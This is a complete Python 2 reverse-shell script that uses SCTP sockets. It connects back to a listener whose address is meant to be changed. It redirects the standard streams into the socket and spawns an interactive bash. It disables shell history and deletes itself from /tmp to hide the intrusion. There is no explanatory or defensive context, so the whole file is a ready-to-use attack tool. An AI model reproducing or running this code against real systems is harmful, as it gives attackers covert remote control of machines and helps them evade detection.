#!/usr/bin/python2
# -*- coding:utf8 -*-

import os
import pty
import socket
from sctp import *

lhost = "127.0.0.1"  # XXX: CHANGEME
lport = 31337  # XXX: CHANGEME


def main():
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    os.putenv("HISTSIZE", 0)
    pty.spawn("/bin/bash")
    s.close()
    os.remove('/tmp/.x.py')


if __name__ == "__main__":
    main()
